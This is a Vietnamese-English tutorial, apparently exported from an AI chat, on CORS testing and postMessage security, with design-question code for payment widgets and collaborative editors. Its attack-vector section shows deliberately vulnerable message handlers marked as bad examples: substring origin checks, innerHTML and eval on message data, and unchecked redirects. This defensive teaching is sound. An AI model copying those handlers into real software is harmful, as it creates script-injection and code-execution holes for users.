    // Test 1: Valid origins
    await this.testValidOrigins();

    // Test 2: Invalid origins
    await this.testInvalidOrigins();

    // Test 3: Preflight caching
    await this.testPreflightCaching();

    // Test 4: Browser-based testing
    await this.testWithBrowser();

    this.generateReport();
  }

  async testValidOrigins() {
    const validOrigins = [
      'https://myapp.com',
      'https://www.myapp.com',
      'https://localhost:3000'
    ];

    for (const origin of validOrigins) {
      try {
        const response = await axios({
          method: 'OPTIONS',
          url: `${this.baseUrl}/api/v1/test`,
          headers: {
            'Origin': origin,
            'Access-Control-Request-Method': 'POST',
            'Access-Control-Request-Headers': 'Content-Type'
          }
        });

        const allowedOrigin = response.headers['access-control-allow-origin'];
        const success = allowedOrigin === origin || allowedOrigin === '*';

        this.testResults.push({
          test: 'Valid Origin',
          origin,
          success,
          details: { allowedOrigin, status: response.status }
        });

      } catch (error) {
        this.testResults.push({
          test: 'Valid Origin',
          origin,
          success: false,
          error: error.message
        });
      }
    }
  }

  async testInvalidOrigins() {
    const invalidOrigins = [
      'https://malicious.com',
      'http://localhost:3000', // Wrong protocol
      'https://fake-myapp.com'
    ];

    for (const origin of invalidOrigins) {
      try {
        const response = await axios({
          method: 'OPTIONS',
          url: `${this.baseUrl}/api/v1/test`,
          headers: {
            'Origin': origin,
            'Access-Control-Request-Method': 'POST'
          }
        });

        const allowedOrigin = response.headers['access-control-allow-origin'];
        const blocked = !allowedOrigin || allowedOrigin !== origin;

        this.testResults.push({
          test: 'Invalid Origin Block',
          origin,
          success: blocked,
          details: { allowedOrigin, status: response.status }
        });

      } catch (error) {
        // Network errors might indicate successful blocking
        this.testResults.push({
          test: 'Invalid Origin Block',
          origin,
          success: true,
          details: { blocked: true, error: error.message }
        });
      }
    }
  }

  async testPreflightCaching() {
    const origin = 'https://myapp.com';
    const url = `${this.baseUrl}/api/v1/test`;

    // First preflight request
    const start1 = Date.now();
    await axios.options(url, { headers: { Origin: origin } });
    const time1 = Date.now() - start1;

    // Wait a moment
    await new Promise(resolve => setTimeout(resolve, 100));

    // Second preflight request (should be cached)
    const start2 = Date.now();
    await axios.options(url, { headers: { Origin: origin } });
    const time2 = Date.now() - start2;

    this.testResults.push({
      test: 'Preflight Caching',
      success: time2 < time1 * 0.8, // Second request should be faster
      details: {
        firstRequest: `${time1}ms`,
        secondRequest: `${time2}ms`,
        improvement: `${((time1 - time2) / time1 * 100).toFixed(1)}%`
      }
    });
  }

  async testWithBrowser() {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();

    // Intercept network requests để analyze CORS headers
    await page.setRequestInterception(true);

    const corsRequests = [];

    page.on('request', request => {
      if (request.url().includes('/api/')) {
        corsRequests.push({
          url: request.url(),
          method: request.method(),
          headers: request.headers()
        });
      }
      request.continue();
    });

    page.on('response', response => {
      if (response.url().includes('/api/')) {
        const corsHeaders = {};
        ['access-control-allow-origin', 'access-control-allow-methods',
         'access-control-allow-headers', 'access-control-allow-credentials']
        .forEach(header => {
          const value = response.headers()[header];
          if (value) corsHeaders[header] = value;
        });

        this.testResults.push({
          test: 'Browser CORS',
          success: Object.keys(corsHeaders).length > 0,
          details: { url: response.url(), corsHeaders }
        });
      }
    });

    // Navigate to test page
    await page.goto(`${this.baseUrl.replace('/api', '')}/test.html`);

    // Trigger CORS requests
    await page.evaluate(() => {
      return Promise.all([
        fetch('/api/v1/data').catch(() => {}),
        fetch('/api/v2/user').catch(() => {})
      ]);
    });

    await browser.close();
  }

  generateReport() {
    console.log('\n📊 CORS Test Results');
    console.log('====================');

    const passed = this.testResults.filter(r => r.success).length;
    const total = this.testResults.length;

    console.log(`Overall: ${passed}/${total} tests passed (${(passed/total*100).toFixed(1)}%)\n`);

    this.testResults.forEach((result, index) => {
      const icon = result.success ? '✅' : '❌';
      console.log(`${icon} ${index + 1}. ${result.test}`);

      if (result.origin) {
        console.log(`   Origin: ${result.origin}`);
      }

      if (result.details) {
        console.log(`   Details:`, JSON.stringify(result.details, null, 4));
      }

      if (result.error) {
        console.log(`   Error: ${result.error}`);
      }

      console.log();
    });
  }
}

// Run tests
const tester = new CORSTestSuite('https://api.myapp.com');
tester.testCORSConfiguration().catch(console.error);
```


---


## 📖 PHẦN V: ADVANCED CROSS-DOMAIN COMMUNICATION


### 🌱 7. POSTMESSAGE API - SECURE CROSS-FRAME COMMUNICATION


#### 🔬 PostMessage Protocol - Deep Architecture Analysis


**The Fundamental Challenge:**


Same-Origin Policy prevents direct JavaScript communication giữa different origins, ngay cả khi chúng là parent/child relationship (iframes). PostMessage API provides một **secure channel** cho cross-origin communication thông qua message passing protocol.


**Core Message Passing Architecture:**


```javascript
// The PostMessage Protocol:
// 1. Source window calls targetWindow.postMessage(data, targetOrigin)
// 2. Browser validates targetOrigin against target window's actual origin
// 3. If valid, browser dispatches 'message' event to target window
// 4. Target window receives MessageEvent với validated source information
// 5. Target window can respond bằng event.source.postMessage()

// Basic implementation example:
// Parent window (https://app.mysite.com):
const iframe = document.getElementById('child-frame');
iframe.onload = function() {
  // Send message to child iframe
  iframe.contentWindow.postMessage({
    type: 'INIT',
    config: { theme: 'dark', language: 'en' }
  }, 'https://widget.partner.com');
};

// Child iframe (https://widget.partner.com):
window.addEventListener('message', function(event) {
  // Security check: Validate origin
  if (event.origin !== 'https://app.mysite.com') {
    return; // Ignore messages from untrusted origins
  }

  const message = event.data;

  if (message.type === 'INIT') {
    initializeWidget(message.config);

    // Send acknowledgment back to parent
    event.source.postMessage({
      type: 'INIT_COMPLETE',
      status: 'success'
    }, event.origin);
  }
});
```


**Browser Implementation Details:**


```javascript
// Simplified browser implementation of postMessage:
class PostMessageSystem {
  constructor() {
    this.messageQueue = new Map(); // Per-window message queues
    this.trustedOrigins = new WeakMap(); // Origin validation cache
  }

  postMessage(sourceWindow, targetWindow, message, targetOrigin) {
    // 1. Origin validation
    const actualTargetOrigin = this.getWindowOrigin(targetWindow);

    if (targetOrigin !== '*' && targetOrigin !== actualTargetOrigin) {
      throw new Error(`Failed to execute 'postMessage': The target origin provided ('${targetOrigin}') does not match the recipient window's origin ('${actualTargetOrigin}').`);
    }

    // 2. Message serialization
    const serializedMessage = this.cloneMessage(message);

    // 3. Create MessageEvent
    const messageEvent = new MessageEvent('message', {
      data: serializedMessage,
      origin: this.getWindowOrigin(sourceWindow),
      source: sourceWindow,
      ports: [] // MessagePort objects for advanced communication
    });

    // 4. Dispatch event (asynchronous)
    this.scheduleEventDispatch(targetWindow, messageEvent);
  }

  cloneMessage(message) {
    // Structured cloning algorithm implementation
    // Handles: Objects, Arrays, Dates, RegExp, ArrayBuffers, etc.
    // Throws: Functions, DOM nodes, certain object types
    return structuredClone ? structuredClone(message) : JSON.parse(JSON.stringify(message));
  }

  scheduleEventDispatch(targetWindow, event) {
    // Use microtask queue để ensure asynchronous delivery
    queueMicrotask(() => {
      if (!targetWindow.closed) {
        targetWindow.dispatchEvent(event);
      }
    });
  }
}
```


#### 💡 Production PostMessage Patterns - Enterprise Solutions


**Pattern 1: Type-Safe Message Protocol**


```javascript
// Type-safe message protocol với TypeScript-style runtime validation
class TypedPostMessage {
  constructor(targetOrigin, sourceWindow = window) {
    this.targetOrigin = targetOrigin;
    this.sourceWindow = sourceWindow;
    this.messageHandlers = new Map();
    this.messageId = 0;
    this.pendingResponses = new Map();

    this.setupMessageListener();
  }

  // Define message types với validation schemas
  defineMessageType(type, requestSchema, responseSchema) {
    this.messageHandlers.set(type, {
      requestSchema,
      responseSchema,
      handler: null
    });
  }

  // Send typed message với response handling
  async sendMessage(type, payload, timeout = 5000) {
    const messageHandler = this.messageHandlers.get(type);
    if (!messageHandler) {
      throw new Error(`Unknown message type: ${type}`);
    }

    // Validate payload against schema
    this.validatePayload(payload, messageHandler.requestSchema);

    const messageId = ++this.messageId;
    const message = {
      id: messageId,
      type,
      payload,
      timestamp: Date.now(),
      expectResponse: true
    };

    // Create promise for response
    const responsePromise = new Promise((resolve, reject) => {
      const timeoutId = setTimeout(() => {
        this.pendingResponses.delete(messageId);
        reject(new Error(`Message timeout: ${type}`));
      }, timeout);

      this.pendingResponses.set(messageId, {
        resolve: (response) => {
          clearTimeout(timeoutId);
          // Validate response against schema
          this.validatePayload(response, messageHandler.responseSchema);
          resolve(response);
        },
        reject: (error) => {
          clearTimeout(timeoutId);
          reject(error);
        }
      });
    });

    // Send message
    this.postMessage(message);

    return responsePromise;
  }

  // Register message handler
  onMessage(type, handler) {
    const messageHandler = this.messageHandlers.get(type);
    if (!messageHandler) {
      throw new Error(`Message type not defined: ${type}`);
    }

    messageHandler.handler = handler;
  }

  setupMessageListener() {
    window.addEventListener('message', async (event) => {
      // Origin validation
      if (event.origin !== this.targetOrigin) {
        console.warn(`Ignored message from untrusted origin: ${event.origin}`);
        return;
      }

      const message = event.data;

      // Handle response messages
      if (message.responseToId) {
        const pendingResponse = this.pendingResponses.get(message.responseToId);
        if (pendingResponse) {
          this.pendingResponses.delete(message.responseToId);
          if (message.error) {
            pendingResponse.reject(new Error(message.error));
          } else {
            pendingResponse.resolve(message.payload);
          }
        }
        return;
      }

      // Handle request messages
      const messageHandler = this.messageHandlers.get(message.type);
      if (!messageHandler || !messageHandler.handler) {
        console.warn(`No handler for message type: ${message.type}`);
        return;
      }

      try {
        // Validate incoming message
        this.validatePayload(message.payload, messageHandler.requestSchema);

        // Execute handler
        const response = await messageHandler.handler(message.payload, event);

        // Send response if expected
        if (message.expectResponse) {
          this.postMessage({
            responseToId: message.id,
            payload: response,
            timestamp: Date.now()
          });
        }

      } catch (error) {
        if (message.expectResponse) {
          this.postMessage({
            responseToId: message.id,
            error: error.message,
            timestamp: Date.now()
          });
        }
      }
    });
  }

  postMessage(message) {
    if (this.sourceWindow.parent && this.sourceWindow.parent !== this.sourceWindow) {
      // Send to parent
      this.sourceWindow.parent.postMessage(message, this.targetOrigin);
    } else {
      // Send to iframes
      const iframes = document.querySelectorAll('iframe');
      iframes.forEach(iframe => {
        try {
          iframe.contentWindow.postMessage(message, this.targetOrigin);
        } catch (e) {
          // Ignore cross-origin errors for non-matching iframes
        }
      });
    }
  }

  validatePayload(payload, schema) {
    // Simple JSON schema validation (in production, use ajv or similar)
    if (!schema) return;

    if (schema.type === 'object' && typeof payload !== 'object') {
      throw new Error('Payload must be an object');
    }

    if (schema.required) {
      for (const field of schema.required) {
        if (!(field in payload)) {
          throw new Error(`Required field missing: ${field}`);
        }
      }
    }

    // Additional validation logic...
  }
}

// Usage example:
const messenger = new TypedPostMessage('https://widget.partner.com');

// Define message types
messenger.defineMessageType('USER_AUTH', {
  type: 'object',
  required: ['token', 'userId'],
  properties: {
    token: { type: 'string' },
    userId: { type: 'string' }
  }
}, {
  type: 'object',
  required: ['success', 'permissions'],
  properties: {
    success: { type: 'boolean' },
    permissions: { type: 'array' }
  }
});

// Send message với type safety
try {
  const response = await messenger.sendMessage('USER_AUTH', {
    token: 'abc123',
    userId: 'user456'
  });

  console.log('Authentication successful:', response);
} catch (error) {
  console.error('Authentication failed:', error.message);
}

// Handle incoming messages
messenger.onMessage('USER_AUTH', async (payload, event) => {
  // Validate token với external service
  const isValid = await validateToken(payload.token);

  if (isValid) {
    return {
      success: true,
      permissions: ['read', 'write']
    };
  } else {
    throw new Error('Invalid token');
  }
});
```


**Pattern 2: High-Performance Message Channel**


```javascript
// High-performance message channel với batching và compression
class HighPerformanceMessageChannel {
  constructor(targetOrigin, options = {}) {
    this.targetOrigin = targetOrigin;
    this.options = {
      batchSize: options.batchSize || 10,
      batchTimeout: options.batchTimeout || 16, // ~60 FPS
      enableCompression: options.enableCompression || false,
      maxMessageSize: options.maxMessageSize || 64 * 1024 // 64KB
    };

    this.messageBatch = [];
    this.batchTimer = null;
    this.messageQueue = [];
    this.isProcessing = false;

    this.setupMessageProcessor();
    this.setupMessageListener();
  }

  send(message) {
    // Check message size
    const messageSize = this.estimateMessageSize(message);
    if (messageSize > this.options.maxMessageSize) {
      throw new Error(`Message too large: ${messageSize} bytes`);
    }

    // Add to batch
    this.messageBatch.push({
      ...message,
      timestamp: performance.now(),
      size: messageSize
    });

    // Check if batch is full
    if (this.messageBatch.length >= this.options.batchSize) {
      this.flushBatch();
    } else if (!this.batchTimer) {
      // Schedule batch flush
      this.batchTimer = setTimeout(() => this.flushBatch(), this.options.batchTimeout);
    }
  }

  flushBatch() {
    if (this.messageBatch.length === 0) return;

    clearTimeout(this.batchTimer);
    this.batchTimer = null;

    const batch = {
      type: '__BATCH__',
      messages: [...this.messageBatch],
      timestamp: performance.now(),
      compressed: false
    };

    this.messageBatch = [];

    // Apply compression if enabled
    if (this.options.enableCompression && batch.messages.length > 5) {
      batch.compressed = true;
      batch.messages = this.compressMessages(batch.messages);
    }

    // Send batch
    this.postMessage(batch);
  }

  compressMessages(messages) {
    // Simple compression using JSON + gzip-like algorithm
    // In production, use actual compression library
    const serialized = JSON.stringify(messages);

    // Dictionary-based compression for common patterns
    const dictionary = new Map();
    let dictId = 0;

    const compressed = serialized.replace(/("type":"[^"]+"|"timestamp":\d+|"payload":\{[^}]+\})/g, (match) => {
      if (!dictionary.has(match)) {
        dictionary.set(match, `__${dictId++}__`);
      }
      return dictionary.get(match);
    });

    return {
      compressed: compressed,
      dictionary: Object.fromEntries(dictionary)
    };
  }

  decompressMessages(compressedData) {
    let decompressed = compressedData.compressed;

    // Restore dictionary values
    for (const [original, placeholder] of Object.entries(compressedData.dictionary)) {
      decompressed = decompressed.replace(new RegExp(placeholder, 'g'), original);
    }

    return JSON.parse(decompressed);
  }

  setupMessageProcessor() {
    // Process message queue với requestAnimationFrame for smooth performance
    const processQueue = () => {
      if (this.isProcessing || this.messageQueue.length === 0) {
        requestAnimationFrame(processQueue);
        return;
      }

      this.isProcessing = true;

      // Process messages trong chunks để avoid blocking main thread
      const startTime = performance.now();
      const maxProcessingTime = 5; // 5ms max per frame

      while (this.messageQueue.length > 0 && (performance.now() - startTime) < maxProcessingTime) {
        const message = this.messageQueue.shift();
        this.processMessage(message);
      }

      this.isProcessing = false;
      requestAnimationFrame(processQueue);
    };

    requestAnimationFrame(processQueue);
  }

  setupMessageListener() {
    window.addEventListener('message', (event) => {
      if (event.origin !== this.targetOrigin) return;

      const message = event.data;

      if (message.type === '__BATCH__') {
        // Handle batched messages
        let messages = message.messages;

        if (message.compressed) {
          messages = this.decompressMessages(messages);
        }

        // Add all messages to processing queue
        messages.forEach(msg => {
          msg.__batchReceived = true;
          msg.__originalTimestamp = msg.timestamp;
          msg.__receiveTimestamp = performance.now();
          this.messageQueue.push(msg);
        });
      } else {
        // Single message
        message.__receiveTimestamp = performance.now();
        this.messageQueue.push(message);
      }
    });
  }

  processMessage(message) {
    // Performance metrics
    if (message.__originalTimestamp) {
      const latency = message.__receiveTimestamp - message.__originalTimestamp;
      this.recordMetric('message_latency', latency);
    }

    // Emit message event
    window.dispatchEvent(new CustomEvent('message-processed', {
      detail: message
    }));
  }

  recordMetric(name, value) {
    // Performance monitoring
    if (!this.metrics) this.metrics = new Map();

    const metric = this.metrics.get(name) || { count: 0, sum: 0, min: Infinity, max: -Infinity };
    metric.count++;
    metric.sum += value;
    metric.min = Math.min(metric.min, value);
    metric.max = Math.max(metric.max, value);

    this.metrics.set(name, metric);
  }

  getMetrics() {
    const result = {};

    for (const [name, metric] of this.metrics.entries()) {
      result[name] = {
        count: metric.count,
        average: metric.sum / metric.count,
        min: metric.min,
        max: metric.max
      };
    }

    return result;
  }

  estimateMessageSize(message) {
    // Estimate serialized message size
    return JSON.stringify(message).length * 2; // Rough estimate for UTF-16
  }

  postMessage(message) {
    if (window.parent !== window) {
      window.parent.postMessage(message, this.targetOrigin);
    } else {
      // Send to all matching iframes
      document.querySelectorAll('iframe').forEach(iframe => {
        try {
          iframe.contentWindow.postMessage(message, this.targetOrigin);
        } catch (e) {
          // Ignore errors for non-matching origins
        }
      });
    }
  }

  destroy() {
    clearTimeout(this.batchTimer);
    this.flushBatch(); // Send any remaining messages
  }
}
```


#### 🔍 Security Analysis - PostMessage Attack Vectors


**Attack Vector 1: Origin Spoofing**


```javascript
// VULNERABILITY: Insufficient origin validation
// BAD EXAMPLE:
window.addEventListener('message', function(event) {
  // ❌ DANGEROUS: String matching can be bypassed
  if (event.origin.includes('trusted-site.com')) {
    executeCommand(event.data);
  }
});

// Attacker có thể exploit với domain như: "trusted-site.com.evil.com"

// SECURE IMPLEMENTATION:
class SecureMessageValidator {
  constructor() {
    this.trustedOrigins = new Set([
      'https://trusted-site.com',
      'https://www.trusted-site.com',
      'https://api.trusted-site.com'
    ]);

    this.trustedOriginPatterns = [
      /^https:\/\/[\w-]+\.trusted-site\.com$/,
      /^https:\/\/localhost:\d+$/ // Development only
    ];
  }

  isOriginTrusted(origin) {
    // Exact match first
    if (this.trustedOrigins.has(origin)) {
      return true;
    }

    // Pattern matching
    return this.trustedOriginPatterns.some(pattern => pattern.test(origin));
  }

  validateMessage(event) {
    // 1. Origin validation
    if (!this.isOriginTrusted(event.origin)) {
      this.logSecurityViolation('untrusted_origin', {
        origin: event.origin,
        data: event.data,
        timestamp: Date.now()
      });
      return false;
    }

    // 2. Source window validation
    if (!event.source || event.source.closed) {
      this.logSecurityViolation('invalid_source', { origin: event.origin });
      return false;
    }

    // 3. Message structure validation
    if (!this.isValidMessageStructure(event.data)) {
      this.logSecurityViolation('invalid_message_structure', {
        origin: event.origin,
        data: event.data
      });
      return false;
    }

    return true;
  }

  isValidMessageStructure(data) {
    // Ensure message có expected structure
    return data &&
           typeof data === 'object' &&
           typeof data.type === 'string' &&
           data.type.length < 100 && // Prevent DoS
           JSON.stringify(data).length < 1024 * 1024; // 1MB limit
  }

  logSecurityViolation(type, details) {
    console.warn(`🚨 PostMessage Security Violation: ${type}`, details);

    // Send to security monitoring service
    if (window.securityMonitor) {
      window.securityMonitor.reportViolation('postmessage', type, details);
    }
  }
}

// Usage:
const validator = new SecureMessageValidator();

window.addEventListener('message', function(event) {
  if (!validator.validateMessage(event)) {
    return; // Block invalid messages
  }

  // Safe to process message
  handleTrustedMessage(event.data);
});
```


**Attack Vector 2: Data Injection & XSS**


```javascript
// VULNERABILITY: Executing untrusted data
// BAD EXAMPLE:
window.addEventListener('message', function(event) {
  if (event.origin === 'https://trusted-site.com') {
    // ❌ DANGEROUS: Direct DOM manipulation với untrusted data
    document.getElementById('content').innerHTML = event.data.html;

    // ❌ DANGEROUS: Dynamic script execution
    eval(event.data.script);

    // ❌ DANGEROUS: Unsafe URL redirection
    window.location = event.data.redirect;
  }
});

// SECURE IMPLEMENTATION:
class SecureMessageProcessor {
  constructor() {
    this.allowedActions = new Set([
      'UPDATE_TITLE',
      'UPDATE_CONFIG',
      'RESIZE_FRAME',
      'NAVIGATE_TO'
    ]);

    this.sanitizer = new DOMPurify(); // Use DOMPurify library
  }

  processMessage(data) {
    if (!this.allowedActions.has(data.action)) {
      throw new Error(`Unauthorized action: ${data.action}`);
    }

    switch (data.action) {
      case 'UPDATE_TITLE':
        this.updateTitle(data.payload);
        break;

      case 'UPDATE_CONFIG':
        this.updateConfig(data.payload);
        break;

      case 'RESIZE_FRAME':
        this.resizeFrame(data.payload);
        break;

      case 'NAVIGATE_TO':
        this.navigateTo(data.payload);
        break;
    }
  }

  updateTitle(payload) {
    // Sanitize string content
    const sanitizedTitle = this.sanitizeString(payload.title);
    document.title = sanitizedTitle;
  }

  updateConfig(payload) {
    // Validate config structure
    const allowedConfigKeys = ['theme', 'language', 'features'];
    const sanitizedConfig = {};

    for (const key of allowedConfigKeys) {
      if (key in payload) {
        sanitizedConfig[key] = this.sanitizeConfigValue(key, payload[key]);
      }
    }

    this.applyConfig(sanitizedConfig);
  }

  resizeFrame(payload) {
    // Validate dimensions
    const width = Math.max(0, Math.min(2000, parseInt(payload.width) || 0));
    const height = Math.max(0, Math.min(2000, parseInt(payload.height) || 0));

    if (window.frameElement) {
      window.frameElement.style.width = `${width}px`;
      window.frameElement.style.height = `${height}px`;
    }
  }

  navigateTo(payload) {
    // Whitelist allowed URLs
    const allowedDomains = ['trusted-site.com', 'api.trusted-site.com'];
    const url = new URL(payload.url);

    if (!allowedDomains.includes(url.hostname) || url.protocol !== 'https:') {
      throw new Error(`Navigation blocked to untrusted URL: ${payload.url}`);
    }

    window.location.href = url.href;
  }

  sanitizeString(input) {
    if (typeof input !== 'string') return '';

    return input
      .replace(/[<>]/g, '') // Remove HTML brackets
      .slice(0, 1000); // Length limit
  }

  sanitizeConfigValue(key, value) {
    switch (key) {
      case 'theme':
        return ['light', 'dark'].includes(value) ? value : 'light';

      case 'language':
        return /^[a-z]{2}$/.test(value) ? value : 'en';

      case 'features':
        return Array.isArray(value) ?
               value.filter(f => typeof f === 'string').slice(0, 10) : [];

      default:
        return null;
    }
  }
}
```


**Attack Vector 3: Denial of Service (DoS)**


```javascript
// Protection against PostMessage DoS attacks
class PostMessageRateLimiter {
  constructor(options = {}) {
    this.maxMessagesPerSecond = options.maxMessagesPerSecond || 100;
    this.maxMessageSize = options.maxMessageSize || 64 * 1024; // 64KB
    this.windowSize = options.windowSize || 1000; // 1 second

    this.originStats = new Map();
    this.cleanupInterval = setInterval(() => this.cleanup(), this.windowSize);
  }

  checkRateLimit(origin, messageSize) {
    const now = Date.now();
    const stats = this.originStats.get(origin) || {
      messages: [],
      totalBytes: 0,
      lastCleanup: now
    };

    // Clean old messages
    const cutoff = now - this.windowSize;
    const oldMessages = stats.messages;
    stats.messages = oldMessages.filter(msg => msg.timestamp > cutoff);

    // Recalculate total bytes
    stats.totalBytes = stats.messages.reduce((sum, msg) => sum + msg.size, 0);

    // Check rate limits
    if (stats.messages.length >= this.maxMessagesPerSecond) {
      this.logRateLimitViolation(origin, 'message_count', stats.messages.length);
      return false;
    }

    if (messageSize > this.maxMessageSize) {
      this.logRateLimitViolation(origin, 'message_size', messageSize);
      return false;
    }

    if (stats.totalBytes + messageSize > this.maxMessageSize * 10) {
      this.logRateLimitViolation(origin, 'bandwidth', stats.totalBytes);
      return false;
    }

    // Update stats
    stats.messages.push({ timestamp: now, size: messageSize });
    stats.totalBytes += messageSize;
    this.originStats.set(origin, stats);

    return true;
  }

  logRateLimitViolation(origin, type, value) {
    console.warn(`🚨 PostMessage Rate Limit Violation: ${type}`, {
      origin,
      value,
      limit: type === 'message_count' ? this.maxMessagesPerSecond :
             type === 'message_size' ? this.maxMessageSize :
             'unknown'
    });
  }

  cleanup() {
    const now = Date.now();
    const cutoff = now - this.windowSize * 2; // Keep extra history

    for (const [origin, stats] of this.originStats.entries()) {
      if (stats.messages.length === 0 || stats.messages[stats.messages.length - 1].timestamp < cutoff) {
        this.originStats.delete(origin);
      }
    }
  }

  destroy() {
    clearInterval(this.cleanupInterval);
    this.originStats.clear();
  }
}

// Integrate với message handler:
const rateLimiter = new PostMessageRateLimiter({
  maxMessagesPerSecond: 50,
  maxMessageSize: 32 * 1024 // 32KB
});

window.addEventListener('message', function(event) {
  const messageSize = JSON.stringify(event.data).length * 2; // UTF-16 estimate

  if (!rateLimiter.checkRateLimit(event.origin, messageSize)) {
    console.warn('Message blocked by rate limiter');
    return;
  }

  // Process message normally
  processMessage(event);
});
```


### 🎯 **Advanced PostMessage


## Claude


### 🎯 Advanced PostMessage Interview Questions & Practical Exercises


**Principal Level Questions:**


**Q1: Design một secure PostMessage architecture cho embedded payment widget.**


```javascript
/**
 * Requirements:
 * - E-commerce site embeds payment widget từ payment provider
 * - Widget cần access user data (address, payment methods) từ parent
 * - Parent cần receive payment status updates từ widget
 * - Support multiple concurrent payment widgets (multi-checkout)
 * - Secure token exchange và PCI compliance
 * - Real-time fraud detection communication
 */

class SecurePaymentWidgetCommunicator {
  constructor(options) {
    this.widgetOrigin = 'https://secure-payments.stripe.com';
    this.sessionId = options.sessionId;
    this.apiKey = options.publicApiKey;
    this.fraudDetector = options.fraudDetector;

    this.activeWidgets = new Map(); // Track multiple widget instances
    this.messageEncryption = new MessageEncryption(options.encryptionKey);
    this.auditLogger = new PaymentAuditLogger();

    this.setupSecureChannel();
  }

  setupSecureChannel() {
    // 1. Establish encrypted communication channel
    // 2. Implement message authentication codes (MAC)
    // 3. Setup token rotation mechanism
    // 4. Initialize fraud detection hooks

    window.addEventListener('message', (event) => {
      if (!this.validatePaymentMessage(event)) return;

      this.handlePaymentMessage(event.data, event.source);
    });
  }

  async initializeWidget(widgetId, paymentConfig) {
    const secureConfig = await this.prepareSecureConfig(paymentConfig);

    const widget = {
      id: widgetId,
      window: this.getWidgetWindow(widgetId),
      sessionToken: await this.generateSessionToken(),
      encryptionKey: await this.generateWidgetKey(),
      lastActivity: Date.now()
    };

    this.activeWidgets.set(widgetId, widget);

    // Send encrypted initialization message
    const initMessage = this.messageEncryption.encrypt({
      type: 'WIDGET_INIT',
      widgetId,
      config: secureConfig,
      sessionToken: widget.sessionToken
    });

    widget.window.postMessage(initMessage, this.widgetOrigin);

    // Start fraud monitoring for this widget
    this.fraudDetector.monitorWidget(widgetId);
  }

  async handlePaymentMessage(encryptedData, sourceWindow) {
    try {
      const message = this.messageEncryption.decrypt(encryptedData);

      // Validate message authenticity
      if (!this.validateMessageMAC(message)) {
        throw new SecurityError('Invalid message authentication');
      }

      const widget = this.findWidgetByWindow(sourceWindow);
      if (!widget) {
        throw new SecurityError('Unknown widget source');
      }

      switch (message.type) {
        case 'PAYMENT_INITIATED':
          await this.handlePaymentInitiation(message, widget);
          break;

        case 'FRAUD_ALERT':
          await this.handleFraudAlert(message, widget);
          break;

        case 'PAYMENT_COMPLETE':
          await this.handlePaymentCompletion(message, widget);
          break;

        case 'TOKEN_REFRESH_REQUEST':
          await this.handleTokenRefresh(message, widget);
          break;
      }

    } catch (error) {
      this.auditLogger.logSecurityIncident({
        type: 'MESSAGE_PROCESSING_ERROR',
        error: error.message,
        sourceWindow,
        timestamp: Date.now()
      });
    }
  }

  async generateSessionToken() {
    // JWT token với payment-specific claims
    const payload = {
      sessionId: this.sessionId,
      merchantId: this.merchantId,
      timestamp: Date.now(),
      expiresAt: Date.now() + (15 * 60 * 1000) // 15 minutes
    };

    return this.signJWT(payload);
  }
}

// Widget-side implementation:
class PaymentWidgetReceiver {
  constructor() {
    this.parentOrigin = null; // Will be set after handshake
    this.sessionToken = null;
    this.encryptedChannel = null;

    this.initializeSecureReceiver();
  }

  initializeSecureReceiver() {
    window.addEventListener('message', async (event) => {
      // Initial handshake - establish parent origin
      if (!this.parentOrigin) {
        if (await this.validateParentOrigin(event.origin)) {
          this.parentOrigin = event.origin;
          this.setupEncryptedChannel(event.data);
        }
        return;
      }

      // Reject messages từ other origins
      if (event.origin !== this.parentOrigin) {
        this.reportSecurityViolation('origin_mismatch', event);
        return;
      }

      this.handleEncryptedMessage(event.data);
    });
  }

  async processPayment(paymentData) {
    // Enhanced fraud detection
    const fraudScore = await this.calculateFraudScore(paymentData);

    if (fraudScore > 0.8) {
      this.sendSecureMessage({
        type: 'FRAUD_ALERT',
        fraudScore,
        indicators: paymentData.fraudIndicators
      });
      return;
    }

    // Process payment...
    const result = await this.submitPayment(paymentData);

    this.sendSecureMessage({
      type: 'PAYMENT_COMPLETE',
      transactionId: result.transactionId,
      status: result.status,
      receiptData: result.receiptData
    });
  }
}
```


**Q2: Optimize PostMessage performance cho real-time collaborative editor.**


```javascript
/**
 * Scenario: Google Docs-style collaborative editor
 * - Multiple users editing simultaneously
 * - Real-time cursor positions và text changes
 * - 60 FPS smooth scrolling synchronization
 * - Undo/redo operations across users
 * - Performance requirement: <16ms message processing
 */

class CollaborativeEditorCommunicator {
  constructor(editorIframe) {
    this.editorWindow = editorIframe.contentWindow;
    this.editorOrigin = new URL(editorIframe.src).origin;

    // Performance optimization settings
    this.batchingEnabled = true;
    this.batchInterval = 16; // 60 FPS
    this.maxBatchSize = 50;
    this.compressionThreshold = 1024; // Compress batches > 1KB

    // Message queues cho different priorities
    this.highPriorityQueue = []; // Cursor moves, selections
    this.mediumPriorityQueue = []; // Text edits
    this.lowPriorityQueue = []; // Metadata updates

    this.initializePerformantCommunication();
  }

  initializePerformantCommunication() {
    // Use requestAnimationFrame cho smooth 60 FPS updates
    const processMessageQueues = () => {
      const frameStartTime = performance.now();
      const maxFrameTime = 8; // Leave 8ms headroom trong 16ms frame

      // Process high priority messages first
      while (this.highPriorityQueue.length > 0 &&
             (performance.now() - frameStartTime) < maxFrameTime) {
        this.processMessage(this.highPriorityQueue.shift());
      }

      // Process medium priority if time remains
      while (this.mediumPriorityQueue.length > 0 &&
             (performance.now() - frameStartTime) < maxFrameTime) {
        this.processMessage(this.mediumPriorityQueue.shift());
      }

      // Process low priority if time remains
      while (this.lowPriorityQueue.length > 0 &&
             (performance.now() - frameStartTime) < maxFrameTime) {
        this.processMessage(this.lowPriorityQueue.shift());
      }

      requestAnimationFrame(processMessageQueues);
    };

    requestAnimationFrame(processMessageQueues);

    // Setup message batching
    if (this.batchingEnabled) {
      this.setupMessageBatching();
    }
  }

  sendEditMessage(editData, priority = 'medium') {
    const message = {
      type: 'EDIT_OPERATION',
      data: editData,
      timestamp: performance.now(),
      priority
    };

    // Add to appropriate queue based on priority
    switch (priority) {
      case 'high':
        this.highPriorityQueue.push(message);
        break;
      case 'medium':
        this.mediumPriorityQueue.push(message);
        break;
      case 'low':
        this.lowPriorityQueue.push(message);
        break;
    }
  }

  // Optimized cursor position synchronization
  sendCursorUpdate(cursorData) {
    // Use requestAnimationFrame để throttle cursor updates
    if (!this.cursorUpdateScheduled) {
      this.cursorUpdateScheduled = true;

      requestAnimationFrame(() => {
        this.cursorUpdateScheduled = false;

        // Send latest cursor position (discard intermediate positions)
        this.sendEditMessage({
          operation: 'cursor_move',
          position: this.latestCursorPosition,
          userId: this.userId
        }, 'high');
      });
    }

    // Always update latest position
    this.latestCursorPosition = cursorData;
  }

